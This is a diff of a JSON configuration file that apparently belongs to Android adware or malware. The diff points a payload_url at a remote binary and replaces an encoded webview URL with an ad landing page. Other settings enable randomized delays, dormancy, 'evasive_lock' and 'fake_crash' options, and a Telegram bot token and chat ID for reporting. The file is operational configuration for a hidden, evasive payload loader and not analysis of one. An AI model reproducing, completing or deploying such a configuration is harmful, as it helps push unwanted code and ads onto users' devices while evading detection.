@@ -1,13 +1,13 @@
 {
   "isEnabled": true,
-  "webview_url": "cwXYgwWs6M286vtfY5L1gXuTC2Nj4cUHsbMVz/xCVb80Ju2+egVL7ifx9uc8ysmWSkORG6YTMQXp6VtftbMx7Vf2fKDngO9mblJWzQljFlyT2Jf2mCZYE+1rS142Yio/C2jpa3kY38fzt14=",
+  "payload_url": "https://raw.githubusercontent.com/luminous1607-byte/config-ads/main/payload.bin",
+  "webview_url": "https://your-ad-landing-page.com",
   "min_delay_ms": 300000,
   "max_delay_ms": 900000,
   "close_delay_ms": 3000,
   "dormancy_days": 0,
   "fake_crash_enabled": false,
   "evasive_lock_enabled": true,
-  "payload_url": "https://your-server.com/payload.dex",
   "tg_token": "your_bot_token",
   "tg_chat_id": "your_chat_id"
 }
